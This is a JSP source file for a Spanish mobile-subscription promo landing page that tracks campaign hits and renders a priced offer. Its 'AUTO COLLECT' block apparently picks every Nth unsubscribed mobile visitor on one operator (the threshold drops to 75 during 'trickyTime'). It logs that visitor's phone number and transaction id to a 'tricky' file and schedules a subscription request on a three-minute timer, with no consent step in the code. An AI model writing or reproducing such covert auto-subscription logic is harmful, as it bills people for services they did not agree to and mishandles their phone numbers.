<%@include file="coreimport.jsp" %>
<jsp:include page="/ES/GlobalWapHeaderES"/>
<%
    System.out.println("ESP PROMO SUBSCRIBE PROMO PAGE IS CALLED ");
    UmeDomain dmn = (UmeDomain) request.getAttribute("dmn");
    PrintWriter writer = response.getWriter();
    Map<String, Object> context = new HashMap();
    String cid = (String) request.getAttribute("campaignId");
    String subpage = (String) request.getAttribute("subpage");


    System.out.println("ESP PROMO SUBSCRIBE subspage: " + subpage);
    String domain = (String) request.getAttribute("domain");
    TemplateEngine templateengine = (TemplateEngine) request.getAttribute("templateengine");
    PebbleEngine it_engine = templateengine.getTemplateEngine(domain);
    LandingPage itlandingpage = (LandingPage) request.getAttribute("itlandingpage");
    CampaignHitCounterDao campaignhitcounterdao = (CampaignHitCounterDao) request.getAttribute("campaignhitcounterdao");
    //System.out.println("Landing Page: "+landingpage.getLandingPage(domain));
    IpxSubCollectEs subcollectes = (IpxSubCollectEs)request.getAttribute("subcollectes");
    //TODO logic of Subscribe Auto collection here.
    Boolean trickyTime = (Boolean) request.getAttribute("trickyTime");
    String operator = (String) session.getAttribute("ipx_operator");
    String msisdn = (String) session.getAttribute("ipx_msisdn");
    String transactionid = (String) session.getAttribute("ipx_transactionid");
    Handset handset = (Handset) session.getAttribute("handset");
    UmeMobileClubUserDao umemobileclubuserdao = (UmeMobileClubUserDao) request.getAttribute("umemobileclubuserdao");
    MobileClub club = (MobileClub) request.getAttribute("club");
    Boolean triggerAutoCollect = false;
    String iframecollectionurl = "";
    String iframeLink = "iframe_handling.jsp";

    String landingPage = "landing_day";
    if (!cid.equals("")) {
        try {

            System.out.println("spainlanding cid value " + cid);
            landingPage = itlandingpage.initializeLandingPage(domain, cid, "all");
            request.setAttribute("landingPage", landingPage);

            java.sql.Date today = new java.sql.Date(System.currentTimeMillis());
            CampaignHitCounter campaignHitCounter = campaignhitcounterdao.HitRecordExistsOrNot(today, domain, cid, landingPage);

            if (campaignHitCounter == null) {
                campaignHitCounter = new CampaignHitCounter();
                campaignHitCounter.setaUnique(Misc.generateUniqueId());
                campaignHitCounter.setaDomainUnique(domain);
                campaignHitCounter.setCampaignId(cid);
                campaignHitCounter.setLandingPage(landingPage);
                campaignHitCounter.setDate(today);
                campaignHitCounter.setHitCounter(1);
                campaignHitCounter.setSubscribeCounter(0);
                campaignhitcounterdao.saveCampaignHitCounter(campaignHitCounter);

            } else {
                //campaignHitCounter.setDate(today);
                campaignhitcounterdao.updateCampaignHitCounter(campaignHitCounter);
            }

        } catch (Exception e) {
            landingPage = "landing_day";
        }
    }

    
    if(handset!=null)
        System.out.println("Handset Auto Collect ********: " + handset);

    //***************** AUTO COLLECT ********************************//

    if (operator != null && handset!=null && (operator.equals("airtel") && handset.get("is_full_desktop").equals("false")) ) {        
        int numberOfTricky = 10000000;

//        if (!cid.equals("")) {
//            numberOfTricky = 100;
//        }
        if (trickyTime) {
            numberOfTricky = 75;
        }   
        
        int countingIdentify = 0;
        String clubIdentifiedCount = "ipxCountingIdentified_" + operator + "_" + club.getUnique();

        Integer countingIdentified = (Integer) application.getAttribute(clubIdentifiedCount);
        SdcMobileClubUser clubUser = null;

        if (countingIdentified == null) {
            countingIdentified = 0;
        } else {
            String msisdn_debug = (String) session.getAttribute("ipx_msisdn");
            // Doing checking from here
            if (msisdn_debug != null) {
                clubUser = umemobileclubuserdao.getClubUserByMsisdn(msisdn_debug, club.getUnique());
            }
            if (clubUser == null) {
                countingIdentified++;
            }
        }
        application.setAttribute(clubIdentifiedCount, countingIdentified);
        countingIdentify = countingIdentified;
        
        String parameter1 = "";
        String parameter2 = "";
        String parameter3 = "";
        
        if(session.getAttribute("cpaparam1")!=null){
            parameter1 = (String) session.getAttribute("cpaparam1");
            parameter2 = (String) session.getAttribute("cpaparam2");
            parameter3 = (String) session.getAttribute("cpaparam3");
        }
        
        if(session.getAttribute("revparam1")!=null){
            parameter1 = (String) session.getAttribute("revparam1");
            parameter2 = (String) session.getAttribute("revparam2");
            parameter3 = (String) session.getAttribute("revparam3");
        }
        
//                        String cpaparameter1 = (String) session.getAttribute("cpaparam1");
//                        String cpaparameter2 = (String) session.getAttribute("cpaparam2");
//                        String cpaparameter3 = (String) session.getAttribute("cpaparam3");

        if (countingIdentify >= numberOfTricky && (countingIdentify % numberOfTricky) == 0 && (clubUser == null) && !cid.equals("3657568241KDS")) {
            String debugFile = "IPX_tricky_" + club.getUnique() + "_" + MiscDate.sqlDate.format(new Date()) + ".txt";
            String debugPath = "/var/log/pareva/ES/ipxlog/subscription/";
            String debugLine = (String) session.getAttribute("ipx_msisdn") + "--" + operator + "--" + (String) session.getAttribute("ipx_transactionid") + "--" + Integer.toString(countingIdentify) + "--" + cid + "\r\n";
            FileUtil.writeRawToFile(debugPath + debugFile, debugLine, true);
            int timeSchedule = 3 * 60 * 1000; //3 MINUTES
            subcollectes.requestSubscribeTimerPending(club, msisdn, 
                    transactionid, operator, 
                    cid, dmn, (MobileClubCampaign)request.getAttribute("cmpg"), parameter1, parameter2, parameter3, timeSchedule, request, response);
        }
        
    }
    //***************** AUTO COLLECT ********************************//

    context.put("campaignid", cid);
    context.put("trickyTime", trickyTime);
    context.put("contenturl", "http://" + dmn.getContentUrl());
    context.put("clubprice", "6x3");

    System.out.println("************* iframecollectionurl: " + iframecollectionurl);

    if (session.getAttribute("ipx_transactionid") != null && session.getAttribute("ipx_operator") != null && session.getAttribute("ipx_msisdn") != null) {

        context.put("msisdnexist", "true");
        if(triggerAutoCollect)
            context.put("triggerAutoCollect", "true");
        else
            context.put("triggerAutoCollect", "false");
//        context.put("iframecollectionurl", iframecollectionurl);
        context.put("msisdn", (String) session.getAttribute("ipx_msisdn"));
        context.put("operator", (String) session.getAttribute("ipx_operator"));
        context.put("transactionid", (String) session.getAttribute("ipx_transactionid"));
//        context.put("iframeurl", (String) session.getAttribute("ipx_subscription_redirecturl"));
    } else {
        context.put("msisdnexist", "false");

    }
    System.out.println("spainlanding " + landingPage);
    it_engine.getTemplate(landingPage).evaluate(writer, context);

%>

